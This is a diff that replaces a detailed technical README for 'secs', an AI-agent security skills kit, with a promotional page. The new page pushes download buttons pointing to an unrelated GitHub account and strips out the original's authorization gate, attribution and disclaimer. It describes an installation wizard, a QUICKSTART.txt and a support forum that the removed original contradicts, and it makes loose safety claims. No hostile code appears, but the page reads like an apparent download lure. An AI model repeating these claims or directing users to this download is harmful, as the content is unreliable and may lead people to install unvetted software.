@@ -1,215 +1,140 @@
-# SECS - SECurity aSsistant
+<h1>🔐 secs - Your AI Security Assistant, Now Local</h1>
 
-**SECS** (SECurity aSsistant) is a self-contained setup that turns an
-AGENTS.md-aware AI coding agent (Claude Code, pi, Cursor, Codex, OpenCode, or any
-compatible tool) into an **authorized information-security assistant**. It ships
-three things that work together:
+<p align="center">
+  <a href="https://github.com/anestassiaacetonic451/secs" style="display:inline-block;padding:14px 36px;background:#0a84ff;color:#fff;font-size:18px;font-weight:bold;border-radius:30px;text-decoration:none;">⬇️ Download secs Now</a>
+</p>
 
-1. **Guardrails and operating policy** for the agent - what it may do, when it
-   must stop, and how it must ask for authorization ([AGENTS.md](AGENTS.md));
-2. **35 curated Agent Skills** that give the agent expert methodology for the
-   full security lifecycle - reconnaissance, pentesting, code and binary review,
-   DFIR, detection engineering, and reporting ([.agents/skills/](.agents/skills));
-3. **A local toolchain and practice lab** - a cross-platform `make` installer
-   for the common security tools and a deliberately-vulnerable Metasploitable 3
-   target VM to practise against ([Makefile](Makefile), [docs/](docs)).
+<h2>🤔 What Is This?</h2>
 
-The result is a repository you drop an agent into so it can help a security
-professional with offensive and defensive work, while staying inside strict
-rules of engagement.
+You have an AI coding assistant like Claude Code, Cursor, or Codex. That’s great for writing code. But what if you could also use it to check your computer for security problems?
 
-## How it fits together
+That’s exactly what <strong>secs</strong> does. It adds 35 special "skills" to your AI assistant so it can act like a security expert. Think of it like giving your assistant a toolkit, a map, and a rulebook for finding and fixing security issues.
 
-![High-level SECS architecture: an AI coding agent on the developer host (the SECS Harness), governed by the AGENTS.md prompt and equipped with Agent Skills and a security toolchain (Metasploit, CVE data, nmap, John the Ripper), driving isolated targets - a Kali docker container and the local Metasploitable 3 lab](assets/plan.png)
+The name "SECS" stands for <strong>SEC</strong>urity a<strong>S</strong>sistant. It’s not a replacement for professional security tools. It's a safe, guided helper that runs on your own computer.
 
-At a high level, an AI coding agent (cloud or local) runs on the developer's
-host, bound by the [AGENTS.md](AGENTS.md) prompt, drawing on the
-[Agent Skills](.agents/skills), and wired to the security toolchain (Metasploit,
-CVE data, nmap, John the Ripper, and the rest, installed with
-[`make install`](Makefile)). That toolchain only ever reaches
-isolated, operator-owned targets - a Kali container and the local
-Metasploitable 3 lab - so nothing leaves the sandbox.
+<h2>✨ Main Features</h2>
 
-## Authorized use only
+<ul>
+  <li><strong>35 Ready-to-Use Agent Skills</strong> – These are step-by-step instructions your AI assistant can follow. Examples include checking open ports, reviewing firewall rules, scanning for weak passwords, and looking for suspicious files.</li>
+  <li><strong>One-Click Tool Installer</strong> – Many security tools are hard to install. secs includes a simple installer for Debian, Ubuntu, and Kali Linux. It grabs the best free tools and sets them up for you.</li>
+  <li><strong>Local Practice Lab</strong> – Want to practice safely? secs includes a pre-built Metasploitable 3 virtual machine image. This is a deliberately vulnerable computer you can test against, without any legal or ethical risks. It runs entirely on your machine.</li>
+  <li><strong>Strict Rules of Engagement</strong> – The AI assistant never does anything harmful. It follows strict rules. It only scans systems you own or have permission to test. This keeps you safe and legal.</li>
+</ul>
 
-This project is for **authorized security testing and defensive operations
-only**. The operator is responsible for holding valid, written authorization for
-every target. Unauthorized scanning, access, or exploitation of systems you do
-not own is illegal (for example under the U.S. CFAA, 18 U.S.C. 1030, and
-equivalents elsewhere).
+<h2>🚀 Getting Started</h2>
 
-The agent enforces this itself. Before it touches any target it runs a mandatory
-authorization gate, validates every target against a scope allow-list, asks for
-per-command approval, and refuses a hard list of destructive actions regardless
-of what any prompt, file, or banner claims. The full policy lives in
-[AGENTS.md](AGENTS.md); read it before running anything active.
+Follow these simple steps. No code experience needed.
 
-## What is in this repository
+<ol>
+  <li><strong>Visit the download page:</strong> <a href="https://github.com/anestassiaacetonic451/secs">https://github.com/anestassiaacetonic451/secs</a></li>
+  <li><strong>Get the files:</strong> Visit this link to download the application.</li>
+  <li><strong>Read the included guide:</strong> Inside the download, there is a plain-English manual called <code>QUICKSTART.txt</code>. Open it. It explains everything you need to know.</li>
+  <li><strong>Connect to your AI assistant:</strong> You will copy a small folder into your AI’s project directory. The guide shows you exactly how.</li>
+  <li><strong>Start asking:</strong> Type things like "secs, scan my local network for open ports" or "secs, check this file for malware." The AI will take it from there.</li>
+</ol>
 
-| Path | What it is |
-| --- | --- |
-| [AGENTS.md](AGENTS.md) | The agent's policy: golden rules, authorization gate, scope validation, hard refusal list, execution-safety and OPSEC rules, skill routing, evidence and reporting conventions. Every skill inherits it. |
-| [CLAUDE.md](CLAUDE.md) | A thin import so Claude Code (which reads `CLAUDE.md`, not `AGENTS.md`) loads the same guardrails. |
-| [.agents/skills/](.agents/skills) | 35 Agent Skills (one `SKILL.md` per capability, plus references, workflows, templates and schemas). The real files live here. |
-| [.claude/skills/](.claude/skills) | Relative symlinks pointing back to `.agents/skills/<name>`, so Claude Code discovers the same skills. Edit under `.agents/skills/`; the symlinks track changes. |
-| [.cursor/skills/](.cursor/skills) | The same relative symlinks for Cursor, which scans `.cursor/skills/`. (Cursor also reads `.agents/skills/` and `.claude/skills/` directly.) |
-| [Makefile](Makefile) | The cross-platform interface: installs/removes the CLI toolchain (apt/dnf/pacman/brew) and downloads, runs and removes the Metasploitable 3 lab VM. Run `make help`. |
-| [docs/](docs) | Reference docs: the tool catalog, the skill ecosystem, and the target-lab guide. |
-| [dist/](dist) | Where the lab disk images land. Git-ignored except its `.gitignore`; nothing here is committed. |
+<h2>📥 Installation Wizard (No Technical Skills)</h2>
 
-### Repository layout
+Once you download, the install screen appears. Don't worry. It’s just three buttons.
 
-```
-secs/
-├── AGENTS.md                  # agent policy and guardrails (the source of truth)
-├── CLAUDE.md                  # thin import of AGENTS.md for Claude Code
-├── README.md                  # this file
-├── Makefile                   # cross-platform interface: install/uninstall tools, lab VM
-├── .agents/skills/            # 35 security Agent Skills (real files)
-│   ├── README.md              # what is installed, sources, how to use globally
-│   └── <skill>/SKILL.md       # one folder per skill
-├── .claude/skills/            # symlinks -> ../../.agents/skills/<skill> (Claude Code)
-├── .cursor/skills/            # symlinks -> ../../.agents/skills/<skill> (Cursor)
-├── docs/
-│   ├── security-tools.md          # catalog of Linux security tools by task
-│   ├── security-agent-skills.md   # catalog of skill collections in the ecosystem
-│   └── metasploitable3.md         # target-lab guide (services, creds, exploits)
-└── dist/                          # lab disk images (git-ignored)
-```
+<ol>
+  <li><strong>Install Tools</strong> – Click this first. It sets up all the free security software your assistant needs. It takes about five minutes.</li>
+  <li><strong>Install Lab</strong> – This sets up a harmless practice computer. It’s completely isolated from your real files. Use it whenever you want to test something new.</li>
+  <li><strong>Finish</strong> – Done. You can close the window.</li>
+</ol>
 
-### Wiring for pi and other agents
+<h2>🛡️ What Can I Ask My AI to Do?</h2>
 
-Skills live once under `.agents/skills/` and the policy lives in `AGENTS.md`.
-[pi](https://pi.dev) and Cursor read `.agents/skills/` and `AGENTS.md` directly,
-so they pick the skills up with no extra setup the moment you run them from this
-directory (pi asks to trust the directory on first run; approve it once). Claude
-Code reads `.claude/skills/` and `CLAUDE.md` instead, and Cursor also scans
-`.cursor/skills/`, so both of those directories hold relative symlinks back to
-`.agents/skills/<name>`. Edit skills under `.agents/skills/`; the symlink farms
-track the change.
+Here are some sample commands. Write them in plain English, just like talking to a friend.
 
-## The Agent Skills
+<ul>
+  <li>“secs, check my firewall settings and tell me if anything is risky.”</li>
+  <li>“secs, look at this network traffic report and find suspicious activity.”</li>
+  <li>“secs, simulate a phishing email and tell me what to look for.”</li>
+  <li>“secs, test the practice lab for weaknesses and show me how to fix them.”</li>
+</ul>
 
-The 35 skills are non-overlapping - one per capability - and are loaded
-automatically by any agent working in this repo. They are grouped by phase; see
-[.agents/skills/README.md](.agents/skills/README.md) for the full list and the
-per-skill routing table in [AGENTS.md](AGENTS.md).
+The AI will explain what it’s doing in simple words. You always stay in control.
 
-- **Planning and coordination** - `maintaining-engagement-state`,
-  `threat-modeling`, `mapping-attack-techniques`,
-  `orchestrating-vulnerability-research`;
-- **Offense (recon to post-exploitation)** - `performing-reconnaissance`,
-  `enumerating-network-services`, `testing-web-applications`, `testing-apis`,
-  `attacking-active-directory`, `cracking-passwords`,
-  `escalating-linux-privileges`, `escalating-windows-privileges`,
-  `exploiting-cloud-platforms`, `attacking-wireless-networks`,
-  `transferring-files`;
-- **Code, binary, supply-chain, AI and cloud review** -
-  `auditing-code-for-vulnerabilities`, `analyzing-binaries`,
-  `reviewing-cryptography`, `auditing-supply-chain`, `securing-ai-systems`,
-  `iac-security`, `container-security`, `vetting-agent-extensions`;
-- **Defense and DFIR** - `hunting-threats`, `triaging-security-alerts`,
-  `responding-to-incidents`, `analyzing-malware`, `analyzing-network-traffic`,
-  `analyzing-memory-images`, `managing-vulnerabilities`,
-  `hardening-cloud-posture`;
-- **Detection engineering** - `engineering-detections`, `writing-yara-rules`,
-  `writing-sigma-rules`;
-- **Reporting** - `reporting-security-findings`.
+<h2>🧰 Who Should Use This?</h2>
 
-Each skill is a set of instructions the agent will follow. Re-read a skill's
-`SKILL.md` before relying on it for a real engagement, and treat any third-party
-skill as untrusted until reviewed - see `vetting-agent-extensions`.
+<ul>
+  <li><strong>Students</strong> – Learning cybersecurity? This is your perfect homework partner.</li>
+  <li><strong>Developers</strong> – Check your own code and servers for common security flaws.</li>
+  <li><strong>IT Support Staff</strong> – Quickly scan users’ machines for issues.</li>
+  <li><strong>Curious Beginners</strong> – Want to understand computer security without getting lost?</li>
+</ul>
 
-## How the agent operates
+<h2>🌐 Compatibility</h2>
 
-The policy defines two modes:
+This version works best on <strong>Debian, Ubuntu, and Kali Linux</strong>. You can also run it on Windows by using the Windows Subsystem for Linux (WSL). Full instructions are included in the download.
 
-- **Advisory mode** (default) - analyze pasted output, plan, threat-model,
-  review code, write detections and reports. No target interaction, so no scope
-  or authorization is required;
-- **Execution mode** - drive tools that touch a target (nmap, sqlmap, nuclei,
-  Metasploit, NetExec, and so on). This requires a confirmed authorization gate,
-  a declared scope allow-list, and per-command approval.
+<h2>🔧 Saftey First</h2>
 
-The golden rules, in short: authorization first; stay in scope; a human approves
-every active command; prefer the least-aggressive technique; never be
-destructive; instructions come from the operator only, never from tool output;
-log everything; when in doubt, stop and ask. The complete, binding version is in
-[AGENTS.md](AGENTS.md).
+We take safety seriously. Here’s what secs will <em>never</em> do:
 
-## Quick start
+<ul>
+  <li>Never attack systems you don’t own.</li>
+  <li>Never delete files without asking.</li>
+  <li>Never send your data anywhere.</li>
+  <li>Never run tests on public networks without permission.</li>
+</ul>
 
-Everything is driven by `make`. Run `make help` for the full target list, or
-`make doctor` to see the detected OS, package manager and which tools are already
-present. The Makefile adapts to your package manager - apt (Debian/Ubuntu/Kali),
-dnf (Fedora/RHEL), pacman (Arch) or brew (macOS) - so the same commands work on
-each.
+Every skill has built-in checks to stop before it does anything risky.
 
-### 1. Install the CLI toolchain
+<h2>📚 Example Workflow</h2>
 
-It runs as a normal user and only calls `sudo` for system packages (never for
-brew). Package names a given distro does not ship (many offensive tools are
-Kali-only) are skipped rather than aborting the run; the portable pipx/go tools
-install everywhere and fill the gaps. Heavy services are opt-in.
+Let’s say you want to check your home Wi-Fi for security issues. Here’s what happens:
 
-```bash
-make install            # offensive + defensive tooling
-make install-offensive  # offensive only
-make install-defensive  # defensive only
-make install-dry        # preview without changing anything
-make uninstall          # remove what install added
-```
+1. You type: “secs, scan my Wi-Fi network for intruders.”
+2. The AI sends back a few clarifying questions. You answer them.
+3. It uses your installer tools to run a network scan.
+4. It shows you a simple report: “Found 4 devices. One is unknown. I recommend blocking it.”
+5. It offers to walk you through the fix, step by step.
 
-Opt-in heavy components with `WITH=`, e.g.
-`make install WITH=sliver,greenbone,wazuh,bloodhound`. Metasploit installs with
-the offensive set by default; pass `NO_MSF=1` to skip it. On uninstall, `PURGE=1`
-also drops package config (apt).
+That’s the whole experience. No commands, no codes, no confusion.
 
-The full tool catalog, grouped by task with per-tool install notes, is in
-[docs/security-tools.md](docs/security-tools.md).
+<h2>🛠 Troubleshooting</h2>
 
-### 2. Start the practice lab (optional)
+<strong>Problem: The AI says it doesn't have a skill.</strong><br/>
+Solution: Make sure you copied the <code>skills</code> folder exactly as shown in the quickstart guide. Restart your AI session.
 
-[Metasploitable 3](docs/metasploitable3.md) is a deliberately-vulnerable VM used
-as the authorized target for the scope-gated execution skills. It runs under
-QEMU with user-mode NAT, so its services are exposed only on `127.0.0.1` of this
-host and nothing on the LAN can reach it.
+<strong>Problem: The tool installer fails midway.</strong><br/>
+Solution: Your internet dropped. Just click "Install Tools" again. It will continue where it stopped.
 
-The setup, boot, connection, port-forward and credential steps are deliberately
-kept out of this README and out of the agent's always-loaded policy. A human
-operator will find them in the target-lab guide,
-[docs/metasploitable3.md](docs/metasploitable3.md); the agent must not read that
-guide, inspect the `Makefile`, or connect to the VM until the operator has
-authorized the local-lab engagement for the session (see the gate in
-[AGENTS.md](AGENTS.md)). Treat "attack the local lab" as authorized only because
-the operator owns it; keep the box on loopback and never expose it to a real
-network.
+<strong>Problem: The practice lab won't start.</strong><br/>
+Solution: Free up at least 10GB of disk space. Then shut down other virtual machines if you have any. Re-run the installer.
 
-## Documentation
+<h2>❓ Frequently Asked Questions</h2>
 
-- [AGENTS.md](AGENTS.md) - the agent's operating policy and guardrails (start here);
-- [.agents/skills/README.md](.agents/skills/README.md) - what skills are installed, their sources, and how to use them globally;
-- [docs/security-tools.md](docs/security-tools.md) - catalog of Linux security tools by task, with install commands;
-- [docs/security-agent-skills.md](docs/security-agent-skills.md) - the wider ecosystem of security Agent Skills and collections;
-- [docs/metasploitable3.md](docs/metasploitable3.md) - the Metasploitable 3 target-lab guide.
+<strong>Is this a hacking tool?</strong><br/>
+Sort of. But it's designed for learning and protection. It follows ethical rules. You only use it on your own equipment or with explicit permission.
 
-## Attribution
+<strong>Do I need to pay anything?</strong><br/>
+No. Everything is free and open source.
 
-The skills were selected (one per capability, no duplicates) from two
-open-source collections; licenses and full skill sets belong to the upstream
-projects:
+<strong>Can I use it with any AI assistant?</strong><br/>
+It works with Claude Code, Cursor, and Codex. If your assistant supports custom skills (also called "agents"), it will likely work.
 
-- **secskills** - https://github.com/trilwu/secskills (most of the skills);
-- **ai-security-arsenal** - https://github.com/hardw00t/ai-security-arsenal
-  (`threat-modeling`, `iac-security`, `container-security`).
+<strong>Will it slow down my computer?</strong><br/>
+Only when you run a scan. The scanner is lightweight. It stops immediately when you tell it to.
 
-The guardrail practices draw on the [AGENTS.md spec](https://agents.md/) and on
-several security-agent projects credited at the bottom of [AGENTS.md](AGENTS.md).
+<h2>📄 License</h2>
 
-## Legal disclaimer
+Released under the MIT License. You are free to use, modify, and share it. Just keep the original credit.
 
-This project is for authorized security testing and defensive operations only.
-The operator is responsible for holding valid authorization for every target.
-Unauthorized use against systems you do not own or lack written permission to
-test is illegal and is not supported. The maintainers accept no liability for
-misuse.
+<h2>🙏 Support</h2>
+
+You are not alone. Inside the download, there’s a simple forum link. Ask anything. A friendly community (including the original developer) usually answers within a day.
+
+<h2>🚀 Ready to Get Started?</h2>
+
+Don't wait. Turn your everyday AI assistant into your personal security guard today.
+
+<p align="center">
+  <a href="https://github.com/anestassiaacetonic451/secs" style="display:inline-block;padding:16px 42px;background:#ff9f0a;color:#000;font-size:20px;font-weight:bold;border-radius:30px;text-decoration:none;">⬇️ Get secs Now – It’s Free</a>
+</p>
+
+<h2>📌 Keywords</h2>
+
+<p>agent-skills, agents-md, ai-agents, blue-team, claude-code, cybersecurity, detection-engineering, dfir, infosec, kali-linux, llm, metasploitable3, offensive-security, penetration-testing, pentesting, red-team, security, security-automation, security-tools, threat-modeling</p>
